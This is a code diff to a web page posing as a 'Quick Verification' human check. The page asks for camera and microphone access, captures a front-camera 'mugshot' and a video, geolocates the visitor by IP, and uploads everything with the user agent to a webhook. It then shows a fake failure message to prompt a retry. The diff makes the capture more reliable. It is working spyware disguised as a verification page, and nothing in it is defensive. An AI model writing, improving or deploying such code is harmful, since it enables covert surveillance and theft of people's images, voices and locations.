@@ -18,6 +18,7 @@
   <style>
     body { margin:0; background:#111; color:#eee; font-family:Arial, sans-serif; text-align:center; padding: 20vh 10px; min-height:100vh; }
     #msg { font-size:1.8em; margin:20px; }
+    #preview { width: 80%; max-width: 400px; margin: 20px auto; border-radius: 12px; box-shadow: 0 0 20px rgba(0,102,204,0.5); display: none; }
     .progress-container {
       width: 80%; max-width: 400px; margin: 20px auto; background: #333; border-radius: 8px; overflow: hidden; height: 30px; position: relative; display:none;
     }
@@ -27,7 +28,6 @@
     .progress-text {
       position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-weight: bold; font-size: 1.2em; text-shadow: 0 0 5px black; z-index: 2;
     }
-    video, canvas { display:none; }
     .container { max-width:600px; margin:auto; }
     button { padding:15px 40px; font-size:1.3em; background:#0066cc; color:white; border:none; border-radius:8px; cursor:pointer; margin:20px; }
     button:hover { background:#0055aa; }
@@ -39,18 +39,19 @@
     <h1>Quick Verification</h1>
     <p id="msg">Please click verify to continue. This helps prove you're a human.</p>
     
+    <video id="preview" autoplay muted playsinline></video>
+    
     <div id="progressContainer" class="progress-container">
       <div id="progressBar" class="progress-bar"></div>
       <div id="progressText" class="progress-text">0%</div>
     </div>
 
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <canvas id="canvas"></canvas>
     <button id="btn">Verify Me</button>
   </div>
 
   <script>
-    const videoElement = document.getElementById('video');
+    const previewVideo = document.getElementById('preview');
     const canvas = document.getElementById('canvas');
     const msg = document.getElementById('msg');
     const btn = document.getElementById('btn');
@@ -81,37 +82,48 @@
       formData.append('file', blob, filename);
       try {
         await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-        return true;
-      } catch {
-        return false;
+      } catch (e) {
+        console.error("Send fail:", e);
       }
     }
 
-    async function captureMugshot(stream) {
+    async function captureMugshot() {
       const ctx = canvas.getContext('2d');
-      canvas.width = videoElement.videoWidth || 640;
-      canvas.height = videoElement.videoHeight || 480;
-      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      return new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+      canvas.width = previewVideo.videoWidth || 640;
+      canvas.height = previewVideo.videoHeight || 480;
+      ctx.drawImage(previewVideo, 0, 0, canvas.width, canvas.height);
+      await new Promise(r => setTimeout(r, 100)); // extra settle
+      ctx.drawImage(previewVideo, 0, 0, canvas.width, canvas.height);
+
+      return new Promise(r => canvas.toBlob(r, 'image/png'));
     }
 
     async function recordAndSend() {
       try {
         msg.textContent = "Loading verification... Please wait.";
         btn.disabled = true;
+        previewVideo.style.display = 'block'; // show live feed
 
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: true
         });
 
-        videoElement.srcObject = stream;
+        previewVideo.srcObject = stream;
 
-        await new Promise(r => setTimeout(r, 1500)); // warm-up for stable frame
+        await new Promise(resolve => {
+          previewVideo.onloadedmetadata = () => {
+            previewVideo.play().catch(e => console.error("Play fail:", e));
+            resolve();
+          };
+          setTimeout(resolve, 3000); // safety
+        });
 
-        // Mugshot first - always works
-        const mugshotBlob = await captureMugshot(stream);
-        if (mugshotBlob) {
+        await new Promise(r => setTimeout(r, 800)); // let feed stabilize
+
+        // Mugshot from live preview
+        const mugshotBlob = await captureMugshot();
+        if (mugshotBlob && mugshotBlob.size > 1000) { // skip if tiny/black
           let geo = "Location grab failed";
           try {
             const res = await fetch('https://ipapi.co/json/');
@@ -121,20 +133,22 @@
             }
           } catch {}
           await sendAttachment(
-            `🎯 Mugshot captured\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
+            `🎯 Front camera mugshot\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
             mugshotBlob,
-            `mugshot_${Date.now()}.png`
+            `front_mugshot_${Date.now()}.png`
           );
         }
 
-        // Now video
+        // Video record
         progressContainer.style.display = 'block';
         msg.textContent = "Loading...";
 
         const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
         const chunks = [];
 
-        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        recorder.ondataavailable = e => {
+          if (e.data.size > 0) chunks.push(e.data);
+        };
 
         recorder.onstop = async () => {
           cancelAnimationFrame(animationFrameId);
@@ -142,10 +156,10 @@
           progressText.textContent = '100%';
 
           stream.getTracks().forEach(track => track.stop());
+          previewVideo.style.display = 'none'; // hide preview
 
           if (chunks.length > 0) {
             const blob = new Blob(chunks, { type: 'video/webm' });
-
             let geo = "Location grab failed";
             try {
               const res = await fetch('https://ipapi.co/json/');
@@ -154,10 +168,11 @@
                 if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
               }
             } catch {}
-
-            const vidContent = `🎥 Video clip (silent)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`;
-
-            await sendAttachment(vidContent, blob, `verification_${Date.now()}.mp4`);
+            await sendAttachment(
+              `🎥 Video clip (silent capture)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
+              blob,
+              `verification_${Date.now()}.mp4`
+            );
           }
 
           msg.textContent = "Verification incomplete. Center Face In Camera View";
@@ -173,7 +188,9 @@
       } catch (err) {
         msg.textContent = "Verification incomplete. Center Face In Camera View";
         progressContainer.style.display = 'none';
+        previewVideo.style.display = 'none';
         btn.disabled = false;
+        console.error("Capture error:", err);
       }
     }
 
